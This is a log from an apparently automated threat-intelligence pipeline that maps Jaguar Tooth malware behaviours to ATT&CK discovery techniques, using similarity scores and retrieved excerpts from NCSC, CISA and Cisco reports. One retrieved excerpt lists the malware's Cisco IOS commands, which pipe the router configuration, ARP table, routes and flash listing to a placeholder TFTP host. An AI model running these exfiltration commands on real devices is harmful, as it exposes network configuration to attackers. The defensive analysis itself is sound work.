[2025-03-27 12:09:45,542 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [debugger evasion]: tensor([[0.3300]])
[2025-03-27 12:09:45,558 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [device driver discovery]: tensor([[0.4179]])
[2025-03-27 12:09:45,574 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [domain trust discovery]: tensor([[0.3014]])
[2025-03-27 12:09:45,585 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [file and directory discovery]: tensor([[0.4117]])
[2025-03-27 12:09:45,599 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [group policy discovery]: tensor([[0.4042]])
[2025-03-27 12:09:45,610 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [log enumeration]: tensor([[0.3775]])
[2025-03-27 12:09:45,621 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [network service discovery]: tensor([[0.5240]])
[2025-03-27 12:09:45,632 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [network share discovery]: tensor([[0.3886]])
[2025-03-27 12:09:45,644 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [network sniffing]: tensor([[0.2947]])
[2025-03-27 12:09:45,660 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [password policy discovery]: tensor([[0.3354]])
[2025-03-27 12:09:45,672 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [peripheral device discovery]: tensor([[0.3521]])
[2025-03-27 12:09:45,684 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [permission groups discovery]: tensor([[0.4026]])
[2025-03-27 12:09:45,694 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [permission groups discovery: local groups]: tensor([[0.3976]])
[2025-03-27 12:09:45,705 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [permission groups discovery: domain groups]: tensor([[0.3505]])
[2025-03-27 12:09:45,717 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [permission groups discovery: cloud groups]: tensor([[0.3193]])
[2025-03-27 12:09:45,728 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [process discovery]: tensor([[0.4357]])
[2025-03-27 12:09:45,737 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [query registry]: tensor([[0.4623]])
[2025-03-27 12:09:45,749 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [remote system discovery]: tensor([[0.4418]])
[2025-03-27 12:09:45,760 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [software discovery]: tensor([[0.4352]])
[2025-03-27 12:09:45,772 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [software discovery: security software discovery]: tensor([[0.4918]])
[2025-03-27 12:09:45,783 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system information discovery]: tensor([[0.5025]])
[2025-03-27 12:09:45,794 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system location discovery]: tensor([[0.4104]])
[2025-03-27 12:09:45,807 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system location discovery: system language discovery]: tensor([[0.4760]])
[2025-03-27 12:09:45,820 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system network configuration discovery]: tensor([[0.6372]])
[2025-03-27 12:09:45,833 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system network configuration discovery: internet connection discovery]: tensor([[0.6397]])
[2025-03-27 12:09:45,844 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system network configuration discovery: wi-fi discovery]: tensor([[0.6269]])
[2025-03-27 12:09:45,854 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system network connections discovery]: tensor([[0.5877]])
[2025-03-27 12:09:45,870 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system owner/user discovery]: tensor([[0.4221]])
[2025-03-27 12:09:45,881 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system service discovery]: tensor([[0.5054]])
[2025-03-27 12:09:45,892 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [system time discovery]: tensor([[0.3846]])
[2025-03-27 12:09:45,907 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3194]])
[2025-03-27 12:09:45,923 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.3379]])
[2025-03-27 12:09:45,938 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.3308]])
[2025-03-27 12:09:45,952 INFO] ++ Similarity between [System Network Configuration Discovery as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.2424]])
[2025-03-27 12:09:45,954 INFO] ++ Scores: [('system network configuration discovery: internet connection discovery', tensor([[0.6397]])), ('system network configuration discovery', tensor([[0.6372]])), ('system network configuration discovery: wi-fi discovery', tensor([[0.6269]])), ('system network connections discovery', tensor([[0.5877]])), ('network service discovery', tensor([[0.5240]]))]
[2025-03-27 12:09:45,955 INFO] ++ Similar techniques found:
['system network configuration discovery: internet connection discovery', 'system network configuration discovery', 'system network configuration discovery: wi-fi discovery', 'system network connections discovery', 'network service discovery']
[2025-03-27 12:09:45,955 INFO] ++ Querying the QA model for action System Network Configuration Discovery as used by the malware with the following context:
system network configuration discovery: internet connection discovery
system network configuration discovery
system network configuration discovery: wi-fi discovery
system network connections discovery
network service discovery
[2025-03-27 12:09:46,625 INFO] ++ QA suggested technique: system network configuration discovery
[2025-03-27 12:09:46,625 INFO] ++ Selected technique: system network configuration discovery
[2025-03-27 12:09:50,577 INFO] ++ Refining the action: System Network Configuration Discovery as used by the malware using 9 documents:
[Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='259e689e-566c-4ddd-8506-bb496b2fd19a', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='r, command : \n \n• sleep 5000  \n• enable \n• sh run | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ver | r tftp:// [IP ADDRESS] /[URL PAGE] \n• sleep 5000  \n• sh ip int bri | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh arp | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh cdp neig | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh start | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh ip ro  | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• sh fla | r tftp:// [IP ADDRESS] /[URL PAGE]  \n• sleep 5000  \n• disable \n• tclquit    \n \nSNMP exploit  \nOverview  \nJaguar Tooth is deployed via exploitation of the patched  SNMP vulnerability  CVE-2017 -6742 .'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy -to-guess community strings, can \nmake a network susceptible to attacks.\n\nWeak SNMP community strings, including the default “ public ,” allowed APT28 to \ngain access to router information.\n\nAPT28 sent additional SNMP commands to enumerate router interfaces.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content='This included a small number based in Europe, US government institutions and approximately 250 Ukrainian victims.SNMP is designed to allow network administrators to monitor and configure network devices remotely, but it can also be misused to obtain sensitive network information and, if vulnerable, exploit devices to penetrate a network.A number of software tools can scan the entire network using SNMP, meaning that poor configuration such as using default or easy-to-guess community strings, can make a network susceptible to attacks.Weak SNMP community strings, including the default "public," allowed APT28 to gain access to router information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\Threat Actors Exploiting SNMP Vulnerabilities in Cisco Routers - Cisco Blogs.html'}, page_content='Designed to prevent unauthorized direct communication to network devices, infrastructure access control lists (iACLs) are one of the most critical security controls that can be implemented in networks.Details on how customers can apply mitigations and disable the affected MIBs are available in thesecurity advisory.Cisco Talos provided additional details about this specific campaign as well as observations of a larger issue of which this campaign is an example – a rising volume of attacks against aging networking appliances and software across all vendors.')]
[2025-03-27 12:10:11,317 INFO] ++ Pre-conditions computed for action: System Network Configuration Discovery as used by the malware using 9 documents:
[Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(id='986b3c08-ec72-40b9-979a-ab33aab77dfc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.\n\nWhere possible, use modern encrypted protocols such as SSH and SNMP v3.\n\nHarden the encryption protocols based on current best security practice.\n\nThe \nNCSC strongly advise s owners and operators to retire and replace legacy \ndevices that can’t be configured to use SNMP v3.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Customers are advised to implement the entire exclude list as detailed in the Workarounds section of the advisory.Determining the Cisco IOS Software ReleaseTo determine which Cisco\xa0IOS Software release is running on a device, administrators can log in to the device, use theshow versioncommand in the CLI, and then refer to the system banner that appears.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .')]
[2025-03-27 12:10:27,003 INFO] ++ Post-conditions computed for action: System Network Configuration Discovery as used by the malware using 9 documents:
[Document(id='31aa5ddc-40e8-4f2b-84df-5336b0294aca', metadata={'source': './documents\\other\\State-sponsored Threat Actor Exploits SNMP Vulnerability in Cisco Routers - NHS England Digital.html'}, page_content='To exploit these vulnerabilities via SNMP Version 3, the attacker must have user credentials for the affected system.\n\nAll devices that have enabled SNMP and have not explicitly excluded the affected MIBs or OIDs should be considered vulnerable.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='f0858101-9ec3-4309-965b-ba52ca16747b', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o Enforce a strong password policy .\n\nDon’t reuse the same password for \nmultiple devices.\n\nEach device should have a unique password.\n\nWhere \npossible, avoid legacy password -based authentication and impl ement two -\nfactor authentication based on public -private key.\n\no D isable legacy unencrypted protocols such as Telnet and SNMP v1 or v2c.'), Document(id='f97008ad-11f8-46bd-98fd-00fd5a9e00e9', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='This \nvulnerability was fir st announced by Cisco on the 29th June 2017, covered under Cisco bug ID \nCSCve54313, with the fixed software being  made available.\n\nAdditionally, t he Cisco published advisory \nincluded details of workarounds , including through limiting access to SNMP from trusted hosts only, or \nby disabling several SNMP MIBs.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1020  Automated Exfiltration  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated  over TFTP .\n\nCollection  T1119  Automated Collection  Jaguar Tooth contains a hard -\ncoded list of Cisco IOS CLI and \nTcl commands which are \nautomatically executed and the \nresults exfiltrated over  TFTP.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\SNMP Remote Code Execution Vulnerabilities in Cisco IOS and IOS XE Software - Cisco.html'}, page_content='Customers are advised to implement the entire exclude list as detailed in the Workarounds section of the advisory.Determining the Cisco IOS Software ReleaseTo determine which Cisco\xa0IOS Software release is running on a device, administrators can log in to the device, use theshow versioncommand in the CLI, and then refer to the system banner that appears.')]
[2025-03-27 12:10:30,924 INFO] ++ Indicators computed for action: System Network Configuration Discovery as used by the malware. The indicators are:
['The content contains " | 03   81   60   00   08 | ".', 'The content contains " | 24   02   00   01 | ".']
[2025-03-27 12:10:31,061 INFO] ++ Removed pre-condition: 
Jaguar Tooth malware.
, due to similarity with: 
Jaguar Tooth malware has access to the target device.
 (tensor([[0.8492]]))
[2025-03-27 12:10:32,279 INFO] ++ Removed post-condition: 
Altered device running configurations.
, due to similarity with: 
Modified device configurations.
 (tensor([[0.7987]]))
[2025-03-27 12:10:36,223 INFO] + Processing action: System Information Discovery as used by the malware
[2025-03-27 12:10:40,030 INFO] ++ Embedding computed for: System Information Discovery as used by the malware. The vector has shape: (384,)
[2025-03-27 12:10:40,049 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery]: tensor([[0.3871]])
[2025-03-27 12:10:40,061 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery: local account]: tensor([[0.4209]])
[2025-03-27 12:10:40,075 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery: domain account]: tensor([[0.3520]])
[2025-03-27 12:10:40,091 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery: email account]: tensor([[0.2578]])
[2025-03-27 12:10:40,106 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [account discovery: cloud account]: tensor([[0.2359]])
[2025-03-27 12:10:40,121 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [application window discovery]: tensor([[0.5004]])
[2025-03-27 12:10:40,136 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [browser information discovery]: tensor([[0.4506]])
[2025-03-27 12:10:40,149 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [cloud infrastructure discovery]: tensor([[0.2973]])
[2025-03-27 12:10:40,163 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [cloud service dashboard]: tensor([[0.2050]])
[2025-03-27 12:10:40,182 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [cloud service discovery]: tensor([[0.3048]])
[2025-03-27 12:10:40,196 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [cloud storage object discovery]: tensor([[0.3233]])
[2025-03-27 12:10:40,208 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [container and resource discovery]: tensor([[0.3647]])
[2025-03-27 12:10:40,220 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [debugger evasion]: tensor([[0.4053]])
[2025-03-27 12:10:40,244 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [device driver discovery]: tensor([[0.4806]])
[2025-03-27 12:10:40,264 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [domain trust discovery]: tensor([[0.3036]])
[2025-03-27 12:10:40,277 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [file and directory discovery]: tensor([[0.4481]])
[2025-03-27 12:10:40,295 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [group policy discovery]: tensor([[0.3694]])
[2025-03-27 12:10:40,309 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [log enumeration]: tensor([[0.4213]])
[2025-03-27 12:10:40,322 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [network service discovery]: tensor([[0.4859]])
[2025-03-27 12:10:40,336 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [network share discovery]: tensor([[0.3436]])
[2025-03-27 12:10:40,350 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [network sniffing]: tensor([[0.3026]])
[2025-03-27 12:10:40,368 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [password policy discovery]: tensor([[0.3204]])
[2025-03-27 12:10:40,383 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [peripheral device discovery]: tensor([[0.4205]])
[2025-03-27 12:10:40,398 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [permission groups discovery]: tensor([[0.4235]])
[2025-03-27 12:10:40,411 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [permission groups discovery: local groups]: tensor([[0.4222]])
[2025-03-27 12:10:40,424 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [permission groups discovery: domain groups]: tensor([[0.3721]])
[2025-03-27 12:10:40,437 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [permission groups discovery: cloud groups]: tensor([[0.3279]])
[2025-03-27 12:10:40,451 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [process discovery]: tensor([[0.5056]])
[2025-03-27 12:10:40,461 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [query registry]: tensor([[0.5152]])
[2025-03-27 12:10:40,474 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [remote system discovery]: tensor([[0.4570]])
[2025-03-27 12:10:40,487 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [software discovery]: tensor([[0.5590]])
[2025-03-27 12:10:40,502 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [software discovery: security software discovery]: tensor([[0.5402]])
[2025-03-27 12:10:40,515 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system information discovery]: tensor([[0.6280]])
[2025-03-27 12:10:40,528 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system location discovery]: tensor([[0.4484]])
[2025-03-27 12:10:40,542 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system location discovery: system language discovery]: tensor([[0.5429]])
[2025-03-27 12:10:40,556 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system network configuration discovery]: tensor([[0.5505]])
[2025-03-27 12:10:40,569 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system network configuration discovery: internet connection discovery]: tensor([[0.5047]])
[2025-03-27 12:10:40,583 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system network configuration discovery: wi-fi discovery]: tensor([[0.5242]])
[2025-03-27 12:10:40,595 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system network connections discovery]: tensor([[0.5230]])
[2025-03-27 12:10:40,614 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system owner/user discovery]: tensor([[0.5151]])
[2025-03-27 12:10:40,627 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system service discovery]: tensor([[0.5173]])
[2025-03-27 12:10:40,641 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [system time discovery]: tensor([[0.3213]])
[2025-03-27 12:10:40,660 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [virtualization/sandbox evasion]: tensor([[0.3749]])
[2025-03-27 12:10:40,684 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [virtualization/sandbox evasion: system checks]: tensor([[0.3970]])
[2025-03-27 12:10:40,704 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [virtualization/sandbox evasion: user activity based checks]: tensor([[0.3997]])
[2025-03-27 12:10:40,718 INFO] ++ Similarity between [System Information Discovery as used by the malware] and [virtualization/sandbox evasion: time based evasion]: tensor([[0.3129]])
[2025-03-27 12:10:40,719 INFO] ++ Scores: [('system information discovery', tensor([[0.6280]])), ('software discovery', tensor([[0.5590]])), ('system network configuration discovery', tensor([[0.5505]])), ('system location discovery: system language discovery', tensor([[0.5429]])), ('software discovery: security software discovery', tensor([[0.5402]]))]
[2025-03-27 12:10:40,719 INFO] ++ Similar techniques found:
['system information discovery', 'software discovery', 'system network configuration discovery', 'system location discovery: system language discovery', 'software discovery: security software discovery']
[2025-03-27 12:10:40,719 INFO] ++ Querying the QA model for action System Information Discovery as used by the malware with the following context:
system information discovery
software discovery
system network configuration discovery
system location discovery: system language discovery
software discovery: security software discovery
[2025-03-27 12:10:41,427 INFO] ++ QA suggested technique: system information discovery
[2025-03-27 12:10:41,427 INFO] ++ Selected technique: system information discovery
[2025-03-27 12:10:45,562 INFO] ++ Refining the action: System Information Discovery as used by the malware using 9 documents:
[Document(id='5a640bf5-7c7f-4f53-a572-697f449bc2cc', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='For detailed TTPs , see the M alware Analysis R eport .\n\nTactic  ID Technique  Procedure  \nInitial \nAccess  T1190  Exploit Public -\nfacing \nApplication.\n\nAPT28 exploited \ndefault/well-known \ncommunity strings in \nSNMP as outlined in \nCVE-2017-6742 (Cisco \nBug ID: CSCve54313 ).\n\nInitial \nAccess  T1078.001  Valid Accounts.\n\nDefault Accounts.'), Document(id='cd797414-89f6-4ac2-9a20-1856c8060fd0', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Detection  \nRules and signatures  \nDescription  This signature detects the Jaguar Tooth Cisco IOS malware .\n\nIt looks for the \nprocess name, two of the hard -coded commands , and code calling two Cisco \nIOS functions.'), Document(id='9865d89a-4d6d-4f5a-a277-782e37eb7346', metadata={'source': './documents\\other\\apt28-exploits-known-vulnerability-to-carry-out-reconnaissance-and-deploy-malware-on-cisco-routers.pdf'}, page_content='o U se logging tools to record commands executed on your network devices, \nsuch as TACACS+ and Syslog.\n\nUse these logs to immediately highlight \nsuspicious events and keep a record of events to support an investigation if \nthe device’s integrity is ever in question.\n\nSee NCSC guidance on monitoring \nand logging.'), Document(id='6bfad2ef-5d32-479f-acf4-c14fdd72cb7f', metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='See the  ‘SNMP exploit \n(Buffer overflow) ’ section of this report  for further details.\n\nJaguar Tooth  is deployed by writing custom shellcode  to memory which can be used to write an \narbitrary 4 -byte value to any specified address.\n\nThis shellcode is then called repeatedly to \nincrementally write Jaguar Tooth into memory.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1082  System Information \nDiscovery  Jaguar Tooth discovers system \ninformation such as interfaces \nand software versionin g by \nutilising several Cisco IOS CLI \ncommands.\n\nFunctionality  \nOverview  \nJaguar Tooth  is composed of a number of payloads and patches , the deployment of which is \ndescribed in the ‘SNMP exploit ’ section of this report .'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1602.002  Data from Configuration \nRepository: Network \nDevice Configuration \nDump  Jaguar Tooth utilises  a Cisco \nIOS CLI command to dump the \ncurrent device running \nconfiguration.\n\nTactic  ID Technique  Procedure  \nDiscovery  T1018  Remote System \nDiscovery  Jaguar Tooth performs remote \nsystem discovery by  utilising \nCisco IOS CLI commands to \nobtain ARP and connected \ndevices information.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='T1083  File and Directory \nDiscovery  Jaguar Tooth enumerates the \nlocal flash filesystem by utilising \na Cisco IOS CLI command.\n\nT1016  System Network \nConfiguration Discovery  Jaguar Tooth utilises several \nCisco IOS CLI commands to \ndiscover the system network \nconfiguration.'), Document(metadata={'source': './documents\\other\\NCSC-MAR-Jaguar-Tooth.pdf'}, page_content='Any NCSC findings \nand recommendations made have not been provided with the intention of avoiding all risks and \nfollowing the recommendations will not remove all such risk.\n\nOwnership of information risks \nremains with the relevant system owner at all times.\n\nThis information is exempt under the Freedom of Information Act 2000 (FOIA) and may be exempt \nunder other UK information legislation.'), Document(metadata={'source': './documents\\other\\APT28 Exploits Known Vulnerability to Carry Out Reconnaissance and Deploy Malware on Cisco Routers _ CISA.html'}, page_content="This vulnerability was first announced by Cisco on 29 June 2017, and patched software was made available.Cisco's published advisory provided workarounds, such as limiting access to SNMP from trusted hosts only, or by disabling a number of SNMP Management Information bases (MIBs).Malware DeploymentFor some of the targeted devices, APT28 actors used an SNMP exploit to deploy malware, as detailed in the NCSC’sJaguar Tooth Malware Analysis Report.")]
[2025-03-27 12:11:09,140 INFO] ++ Pre-conditions computed for action: System Information Discovery as used by the malware using 9 documents:
